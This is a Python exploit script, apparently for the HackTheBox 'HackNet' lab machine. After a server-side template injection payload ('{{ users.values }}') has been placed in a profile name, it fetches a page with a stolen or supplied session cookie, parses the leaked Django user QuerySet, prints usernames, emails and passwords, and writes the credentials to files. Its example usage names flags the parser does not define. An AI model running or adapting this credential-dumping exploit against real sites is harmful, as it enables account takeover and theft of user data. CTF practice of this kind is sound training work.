import requests
import argparse
from bs4 import BeautifulSoup
import sys
import html
import ast


def parse_arguments()->argparse.Namespace:
    # Create an ArgumentParser object
    parser = argparse.ArgumentParser(description="Update profile name in HTB HackNet Machine.",
                                     epilog=f"""
Example usage:
python3 {sys.argv[0]} -n 'test' --csrftoken 'gcb1jgkc9JBOH5ZbZE9Ajxkf7M1oly3k' --session 'qz3kztdxme2zhaybb0d4zynuxd66pa0s'""",
                                     formatter_class=argparse.RawTextHelpFormatter)

    # Add arguments with flags
    parser.add_argument("--csrftoken", type=str, help="'csrftoken' variable value from session", required=True)
    parser.add_argument("--sessionid", type=str, help="'sessionid' variable value from session", required=True)
    parser.add_argument("--post-id", type=int, help="Post ID identifier. Default=10", default=10)

    return parser.parse_args()

    
def get_text_from_liked_post(args)->str:
    likes_post_url = f"http://hacknet.htb/likes/{args.post_id}"
    profile_cookies = {
        "csrftoken": args.csrftoken,
        "sessionid": args.sessionid,
    }
    req_check_post = requests.get(likes_post_url, cookies=profile_cookies)
    return req_check_post.text


def save_data_in_file(data_list, filename: str)->None:
    with open(filename, "w", encoding="utf-8") as f:
        for data in data_list:
            f.write(data + "\n")
    return


def prettify_output(html_text: str, post_id: int)->None:
    soup = BeautifulSoup(html_text, "html.parser")
    usernames = []
    passwords = []
    # Iterate over all <img> tags and keep the one we are interested in
    for img in soup.find_all("img"):
        title = img.get("title", "")
        unescaped = html.unescape(title)
        if "QuerySet" in unescaped:  # Only process QuerySet
            qs_str = unescaped
            if qs_str.startswith("<QuerySet ") and qs_str.endswith(">"):
                qs_str = qs_str[len("<QuerySet "):-1]
            # Convert string to Python objects safely
            queryset_list = ast.literal_eval(qs_str)
            # Print username, email, password
            for user in queryset_list:
                if user['username'] == "{{ users.values }}":
                    continue
                print(f"Username: {user['username']}, Email: {user['email']}, Password: {user['password']}")
                usernames.append(user['username'])
                passwords.append(user['password'])
    # Save found data in files
    save_data_in_file(usernames, f"postid_{post_id}_usernames_found.txt")
    save_data_in_file(passwords, f"postid_{post_id}_passwords_found.txt")


def main()->None:
    # Get arguments from user
    args: argparse.Namespace = parse_arguments()
    # Retrieve HTML contenxt once SSTI payload has been injected
    html_text: str = get_text_from_liked_post(args)
    # Prettify the output
    prettify_output(html_text, args.post_id)

if __name__ == "__main__":
    main()
